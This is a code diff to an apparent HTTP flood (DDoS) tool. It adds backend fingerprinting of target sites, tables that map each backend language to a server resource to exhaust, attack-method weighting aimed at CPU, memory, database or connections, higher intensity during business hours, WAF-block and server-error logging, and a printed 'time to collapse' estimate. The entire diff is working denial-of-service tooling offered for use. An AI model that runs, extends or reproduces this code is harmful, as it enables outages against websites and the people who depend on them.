@@ -2629,6 +2629,39 @@ class HttpFlood(Thread):
         "best_proxy_for_method": {},  # method -> [top proxy addrs]
         "http_methods_pool": ["GET", "POST", "HEAD", "OPTIONS", "PATCH"],
         "method_diversity_score": 0,  # How many unique methods used recently
+        "backend_lang": None,      # php, nodejs, java, python, aspnet, ruby, go, unknown
+        "backend_framework": None, # laravel, django, spring, express, rails, flask, etc
+        "resource_target": "auto", # cpu, memory, database, io, connection, auto
+        "infra_map": {},           # Full infrastructure fingerprint
+        "time_intensity": 1.0,     # Time-of-day intensity multiplier
+        "last_intensity_check": 0,
+        "attack_log": [],          # Condensed log of key events for learning
+        "methods_per_minute": [],  # Track method variety over time
+        "cognitive_state": "LEARNING", # LEARNING -> EXPLOITING -> ADAPTING -> MASTERING
+    }
+    
+    # ========================================================================
+    #  RESOURCE ATTACK PROFILES: Which methods target which server resource
+    # ========================================================================
+    _RESOURCE_TARGETS = {
+        "cpu":        {"STRESS": 50, "PPS": 40, "POST_DYN": 35, "WP_SEARCH": 45},
+        "memory":     {"SLOW_V2": 60, "GET": 30, "DYN": 35, "COOKIE": 25},
+        "database":   {"WP_SEARCH": 80, "XMLRPC_AMP": 70, "POST_DYN": 50, "DYN": 40},
+        "io":         {"POST_DYN": 45, "POST": 40, "STRESS": 30, "DYN": 35},
+        "connection": {"SLOW_V2": 70, "GET": 35, "COOKIE": 30, "BOT": 25},
+    }
+    
+    # ========================================================================
+    #  BACKEND VULNERABILITY MAP: Known weaknesses per backend technology
+    # ========================================================================
+    _BACKEND_WEAKNESSES = {
+        "php":     {"resource": "cpu",     "methods": {"WP_SEARCH": 70, "POST_DYN": 50, "XMLRPC_AMP": 65}},
+        "nodejs":  {"resource": "memory",  "methods": {"SLOW_V2": 60, "POST_DYN": 45, "DYN": 40}},
+        "java":    {"resource": "memory",  "methods": {"SLOW_V2": 55, "POST_DYN": 50, "STRESS": 35}},
+        "python":  {"resource": "cpu",     "methods": {"POST_DYN": 55, "STRESS": 45, "DYN": 40}},
+        "aspnet":  {"resource": "memory",  "methods": {"SLOW_V2": 50, "POST_DYN": 45, "STRESS": 40}},
+        "ruby":    {"resource": "cpu",     "methods": {"STRESS": 50, "POST_DYN": 45, "DYN": 40}},
+        "go":      {"resource": "connection", "methods": {"SLOW_V2": 55, "PPS": 45, "STRESS": 40}},
     }
     
     # ========================================================================
@@ -2755,6 +2788,10 @@ class HttpFlood(Thread):
                 "gene_pool": intel.get("gene_pool", [])[:3],
                 "rate_limit_threshold": intel.get("rate_limit_threshold"),
                 "path_scores": dict(list(intel.get("path_scores", {}).items())[:20]),
+                "backend_lang": intel.get("backend_lang"),
+                "backend_framework": intel.get("backend_framework"),
+                "resource_target": intel.get("resource_target"),
+                "infra_map": intel.get("infra_map", {}),
             }
             with open(memory_file, 'w') as f:
                 json.dump(save_data, f, indent=2)
@@ -2898,6 +2935,164 @@ class HttpFlood(Thread):
         """Select a random complete browser profile for header consistency."""
         return dict(randchoice(self._BROWSER_PROFILES))
     
+    def _chaos_detect_backend(self):
+        """Deep backend technology detection from response headers and behavior."""
+        intel = self._chaos_intel
+        if intel.get("backend_lang"):
+            return  # Already detected
+            
+        try:
+            import urllib.request
+            target_url = f"{self._target.scheme}://{self._target.authority}/"
+            
+            # Probe with a request that triggers error pages (version leaks)
+            probe_paths = [
+                "/",
+                "/nonexistent_" + str(randint(10000,99999)),  # 404 page
+                "/wp-json/wp/v2/posts",                        # WordPress REST API
+            ]
+            
+            for probe_path in probe_paths:
+                try:
+                    url = f"{self._target.scheme}://{self._target.authority}{probe_path}"
+                    req = urllib.request.Request(url, headers={
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
+                    })
+                    with urllib.request.urlopen(req, timeout=5) as resp:
+                        headers = str(resp.headers).lower()
+                        powered_by = resp.headers.get('X-Powered-By', '').lower()
+                        body = resp.read(4096).decode('utf-8', errors='ignore').lower()
+                        
+                        # Detect backend language
+                        if 'php' in powered_by or 'php' in headers:
+                            intel["backend_lang"] = "php"
+                        elif 'express' in powered_by or 'x-powered-by: express' in headers:
+                            intel["backend_lang"] = "nodejs"
+                            intel["backend_framework"] = "express"
+                        elif 'asp.net' in powered_by or 'asp.net' in headers:
+                            intel["backend_lang"] = "aspnet"
+                        elif 'django' in body or 'csrfmiddlewaretoken' in body:
+                            intel["backend_lang"] = "python"
+                            intel["backend_framework"] = "django"
+                        elif 'flask' in headers or 'werkzeug' in headers:
+                            intel["backend_lang"] = "python"
+                            intel["backend_framework"] = "flask"
+                        elif 'x-powered-by: next' in headers or '__next' in body:
+                            intel["backend_lang"] = "nodejs"
+                            intel["backend_framework"] = "nextjs"
+                        elif 'phusion passenger' in headers or 'x-powered-by: passenger' in headers:
+                            intel["backend_lang"] = "ruby"
+                            intel["backend_framework"] = "rails"
+                        elif 'laravel' in headers or 'laravel_session' in headers:
+                            intel["backend_lang"] = "php"
+                            intel["backend_framework"] = "laravel"
+                        elif 'spring' in headers or 'jsessionid' in headers:
+                            intel["backend_lang"] = "java"
+                            intel["backend_framework"] = "spring"
+                            
+                        if intel.get("backend_lang"):
+                            break
+                except Exception:
+                    continue
+                    
+            if not intel.get("backend_lang"):
+                # Heuristic based on CMS
+                cms_backend_map = {
+                    "wordpress": "php", "joomla": "php", "drupal": "php",
+                    "shopify": "ruby", "nextjs": "nodejs", "laravel": "php",
+                }
+                intel["backend_lang"] = cms_backend_map.get(intel.get("cms_type"), "unknown")
+                
+            # Auto-select resource target based on backend
+            if intel["backend_lang"] in self._BACKEND_WEAKNESSES:
+                intel["resource_target"] = self._BACKEND_WEAKNESSES[intel["backend_lang"]]["resource"]
+            
+            # Build infrastructure map
+            intel["infra_map"] = {
+                "waf": intel.get("waf_type"),
+                "server": intel.get("server_type"),
+                "cms": intel.get("cms_type"),
+                "backend": intel.get("backend_lang"),
+                "framework": intel.get("backend_framework"),
+                "captcha": intel.get("has_captcha"),
+                "rate_limit": intel.get("has_rate_limit"),
+                "rate_threshold": intel.get("rate_limit_threshold"),
+                "weak_resource": intel.get("resource_target"),
+            }
+            
+            if int(REQUESTS_SENT) < 20:
+                print(f"{bcolors.OKCYAN}[CHAOS DEEP SCAN] Backend: {intel['backend_lang']} | Framework: {intel.get('backend_framework', 'N/A')} | Weak Resource: {intel['resource_target']}{bcolors.RESET}")
+                
+        except Exception:
+            intel["backend_lang"] = "unknown"
+    
+    def _chaos_time_intensity(self):
+        """Adjust attack intensity based on time-of-day patterns.
+        Servers are typically under heaviest legitimate load during business hours.
+        Attacking during peak hours means less capacity to absorb our traffic."""
+        intel = self._chaos_intel
+        now = time()
+        
+        if now - intel.get("last_intensity_check", 0) < 300:  # Check every 5 min
+            return intel.get("time_intensity", 1.0)
+            
+        intel["last_intensity_check"] = now
+        
+        try:
+            from datetime import datetime
+            hour = datetime.utcnow().hour  # UTC hour
+            
+            # Business hours (9-17 UTC) = server under more load = easier to overwhelm
+            if 9 <= hour <= 17:
+                intel["time_intensity"] = 1.3   # 30% more aggressive
+            elif 6 <= hour <= 9 or 17 <= hour <= 21:
+                intel["time_intensity"] = 1.1   # Slightly more
+            elif 0 <= hour <= 6:
+                intel["time_intensity"] = 0.8   # Off-hours, server has spare capacity
+            else:
+                intel["time_intensity"] = 1.0
+        except Exception:
+            intel["time_intensity"] = 1.0
+            
+        return intel["time_intensity"]
+    
+    def _chaos_cognitive_state(self):
+        """Track the AI's cognitive maturity level based on data collected.
+        LEARNING -> EXPLOITING -> ADAPTING -> MASTERING"""
+        intel = self._chaos_intel
+        tick = intel["total_executions"]
+        eff = intel.get("efficiency_score", {})
+        
+        if tick < 50 or len(eff) < 3:
+            intel["cognitive_state"] = "LEARNING"
+        elif tick < 200:
+            avg_eff = sum(eff.values()) / max(len(eff), 1) if eff else 0
+            if avg_eff > 0.5:
+                intel["cognitive_state"] = "EXPLOITING"
+            else:
+                intel["cognitive_state"] = "LEARNING"
+        elif tick < 500:
+            if intel.get("target_weakpoint") and intel.get("best_method"):
+                intel["cognitive_state"] = "ADAPTING"
+            else:
+                intel["cognitive_state"] = "EXPLOITING"
+        else:
+            if intel.get("generation", 0) >= 3 and intel.get("gene_pool"):
+                intel["cognitive_state"] = "MASTERING"
+            else:
+                intel["cognitive_state"] = "ADAPTING"
+                
+        return intel["cognitive_state"]
+    
+    def _chaos_log_event(self, event_type, detail):
+        """Log significant attack events for post-analysis."""
+        intel = self._chaos_intel
+        entry = {"t": int(time() - intel.get("attack_start_time", time())), 
+                 "type": event_type, "detail": detail}
+        intel["attack_log"].append(entry)
+        if len(intel["attack_log"]) > 100:
+            intel["attack_log"] = intel["attack_log"][-100:]
+
     def _chaos_kill_chain(self):
         """Structured Kill Chain Protocol with specific objectives per phase.
         Unlike random phase transitions, this follows a deliberate attack doctrine."""
@@ -4145,6 +4340,48 @@ class HttpFlood(Thread):
             if phase == "ASSAULT":
                 intel["exploration_bonus"] = False
         
+        # === STRATEGY Z: Backend Exploitation ===
+        backend = intel.get("backend_lang", "unknown")
+        if backend in self._BACKEND_WEAKNESSES:
+            backend_data = self._BACKEND_WEAKNESSES[backend]
+            for method_name, bonus in backend_data["methods"].items():
+                weights[method_name] = max(weights.get(method_name, 0), bonus)
+                
+        # === STRATEGY AA: Resource-Targeted Attack ===
+        resource = intel.get("resource_target", "auto")
+        if resource != "auto" and resource in self._RESOURCE_TARGETS:
+            resource_weights = self._RESOURCE_TARGETS[resource]
+            for method_name, bonus in resource_weights.items():
+                weights[method_name] = max(weights.get(method_name, 0), bonus)
+                
+        # === STRATEGY AB: Time-of-Day Intensity ===
+        time_mult = intel.get("time_intensity", 1.0)
+        if time_mult != 1.0:
+            for m in weights:
+                weights[m] = int(weights[m] * time_mult)
+                
+        # === STRATEGY AC: Cognitive State Modifiers ===
+        cognitive = intel.get("cognitive_state", "LEARNING")
+        if cognitive == "LEARNING":
+            # Explore broadly, don't commit too hard to anything
+            for m in weights:
+                if weights[m] > 0:
+                    weights[m] = max(weights[m], 8)
+        elif cognitive == "EXPLOITING":
+            # Focus on what's working
+            best = intel.get("best_method")
+            if best and best in weights:
+                weights[best] = int(weights[best] * 1.4)
+        elif cognitive == "MASTERING":
+            # Maximum precision: evolved DNA + weakpoint
+            wp = intel.get("target_weakpoint")
+            if wp and wp in weights:
+                weights[wp] = int(weights[wp] * 1.8)
+            # Also suppress consistently bad methods hard
+            worst = intel.get("worst_method")
+            if worst and worst in weights:
+                weights[worst] = max(weights[worst] // 5, 1)
+        
         # === STRATEGY X: Kill Chain Phase Strategy ===
         kc_phase = intel.get("kill_chain_phase", "PROBE")
         
@@ -4278,7 +4515,17 @@ class HttpFlood(Thread):
         if intel["total_executions"] % 10 == 0:
             self._chaos_adaptive_rate()
         
-        # Phase 1.7: KILL CHAIN PROTOCOL
+        # Phase 1.7: BACKEND DETECTION (once after recon)
+        if intel["total_executions"] == 2:
+            self._chaos_detect_backend()
+        
+        # Phase 1.8: TIME-OF-DAY INTENSITY
+        self._chaos_time_intensity()
+        
+        # Phase 1.9: COGNITIVE STATE TRACKING
+        cognitive = self._chaos_cognitive_state()
+        
+        # Phase 1.10: KILL CHAIN PROTOCOL
         kc_phase = self._chaos_kill_chain()
         
         # Phase 1.8: PREDICTIVE MODELING (every 30s via health pulse)
@@ -4442,6 +4689,10 @@ class HttpFlood(Thread):
             # Phase 5: ADAPT with reinforcement learning
             if got_blocked or got_errors:
                 self._chaos_learn(chosen_name, False, got_5xx)
+                if got_5xx:
+                    self._chaos_log_event("5XX", f"{chosen_name} triggered server error")
+                if got_blocked:
+                    self._chaos_log_event("BLOCKED", f"{chosen_name} was blocked by WAF")
                 # Phase 6: RETRY ESCALATION - If method failed, try stronger variant
                 if got_blocked and intel["phase"] in ("ASSAULT", "FINISH"):
                     self._chaos_retry_escalate(chosen_name, method_map)
@@ -4482,6 +4733,14 @@ class HttpFlood(Thread):
                         print(f"  Predicted   : {bcolors.WARNING}~{ttd//60}m {ttd%60}s to collapse{bcolors.RESET}")
                     else:
                         print(f"  Predicted   : {bcolors.FAIL}~{ttd//60}m to collapse (resilient target){bcolors.RESET}")
+                # Infrastructure map
+                backend = intel.get("backend_lang", "?")
+                framework = intel.get("backend_framework", "")
+                resource = intel.get("resource_target", "auto")
+                cog = intel.get("cognitive_state", "LEARNING")
+                cog_colors = {"LEARNING": bcolors.OKCYAN, "EXPLOITING": bcolors.WARNING, "ADAPTING": bcolors.OKBLUE, "MASTERING": f"{bcolors.OKGREEN}{bcolors.BOLD}"}
+                print(f"  Backend     : {backend}{(' / ' + framework) if framework else ''} | Target Resource: {resource}")
+                print(f"  AI State    : {cog_colors.get(cog, '')}{cog}{bcolors.RESET} (Gen {intel.get('generation', 0)})")
                 slope = intel.get("latency_trend_slope", 0)
                 if slope < -50:
                     print(f"  Recovery    : {bcolors.FAIL}TARGET RECOVERING! (slope: {int(slope)}){bcolors.RESET}")
